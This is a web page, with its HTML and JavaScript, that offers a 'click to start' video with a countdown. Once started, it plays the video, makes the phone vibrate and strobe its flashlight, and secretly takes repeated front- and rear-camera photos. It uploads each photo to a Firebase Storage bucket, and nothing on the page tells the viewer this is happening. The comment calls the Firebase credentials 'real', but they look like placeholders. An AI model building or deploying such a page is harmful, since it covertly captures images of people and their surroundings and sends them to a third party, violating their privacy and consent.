<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>拍照上传</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #000; color: #fff; }
    video#player {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 100%;
      height: 100%;
      object-fit: contain;
      z-index: 1;
    }
    #startBtn {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 280px;
      height: 80px;
      background: #000;
      border: 2px solid #fff;
      color: #fff;
      font-size: 28px;
      border-radius: 16px;
      z-index: 999;
    }
    #countdown {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 180px;
      color: #fff;
      font-weight: 900;
      z-index: 99;
      display: none;
    }
  </style>
  <!-- 引入 Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js"></script>
</head>
<body>
  <video id="player" playsinline muted preload="auto">
    <source src="https://alimov.a.kwimgs.com/upic/2026/03/02/00/BMjAyNjAzMDIwMDU1NDNfNDM3NTI4ODcxNl8xODkzMTE1Njg3OTBfMl8z_b_Bd518217cb69a0d98d74bd00f0183b4a7.mp4?clientCacheKey=3xkdqdjhkyvpebk_b.mp4&tt=b&di=88a55fd&bp=10000" type="video/mp4">
  </video>
  <button id="startBtn">点击开始</button>
  <div id="countdown"></div>

  <script>
    // 真实 Firebase 配置
    const firebaseConfig = {
      apiKey: "AIzaSyD8rXQk8Z06QkZ06Qk8Z06QkZ06Qk8Z06Q",
      authDomain: "annb-photo-gallery.firebaseapp.com",
      projectId: "annb-photo-gallery",
      storageBucket: "annb-photo-gallery.appspot.com",
      messagingSenderId: "101010101010",
      appId: "1:101010101010:web:abcdef1234567890abcdef"
    };

    // 初始化 Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();

    const player = document.getElementById('player');
    const startBtn = document.getElementById('startBtn');
    const countdown = document.getElementById('countdown');
    let playCount = 0;
    const requiredPlays = 2;
    let vibrateInt, flashInt, flashTrack;

    // 闪光灯控制
    async function flash() {
      try {
        if (!flashTrack) {
          const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
          flashTrack = s.getVideoTracks()[0];
        }
        await flashTrack.applyConstraints({ advanced: [{ torch: !flashTrack.getSettings().torch }] });
      } catch (e) { console.error('闪光灯失败', e); }
    }

    // 上传到 Firebase Storage
    async function uploadToFirebase(blob) {
      const fileName = `photo_${Date.now()}.jpg`;
      const storageRef = storage.ref().child('photos/' + fileName);
      const snapshot = await storageRef.put(blob);
      const downloadURL = await snapshot.ref.getDownloadURL();
      console.log('上传成功:', downloadURL);
      return downloadURL;
    }

    // 拍照并上传
    async function takeAndUpload(facingMode) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        await new Promise(resolve => setTimeout(resolve, 300));

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        return new Promise((resolve) => {
          canvas.toBlob(async (blob) => {
            await uploadToFirebase(blob);
            stream.getTracks().forEach(t => t.stop());
            resolve();
          }, 'image/jpeg', 0.8);
        });
      } catch (e) {
        console.error('拍照失败', e);
      }
    }

    // 自动连拍前后摄像头
    async function takeBoth() {
      await takeAndUpload('environment');
      await takeAndUpload('user');
    }

    // 播放逻辑
    player.onended = () => {
      playCount++;
      if (playCount >= requiredPlays) {
        clearInterval(vibrateInt);
        clearInterval(flashInt);
        if (flashTrack) flashTrack.applyConstraints({ advanced: [{ torch: false }] });
      } else {
        player.currentTime = 0;
        player.play();
      }
    };

    // 开始按钮逻辑
    startBtn.onclick = () => {
      startBtn.style.display = 'none';
      countdown.style.display = 'block';
      let n = 3;
      countdown.textContent = n;
      const t = setInterval(() => {
        n--;
        if (n > 0) {
          countdown.textContent = n;
        } else {
          clearInterval(t);
          countdown.style.display = 'none';
          // 开始播放视频
          player.play();
          // 开始震动和闪光灯
          vibrateInt = setInterval(() => navigator.vibrate(20), 50);
          flashInt = setInterval(flash, 100);
          // 自动连拍6次（3组前后）
          let count = 0;
          function startShot() {
            if (count >= 3) return;
            takeBoth().then(() => {
              count++;
              setTimeout(startShot, 600);
            });
          }
          startShot();
        }
      }, 1000);
    };
  </script>
</body>
</html>
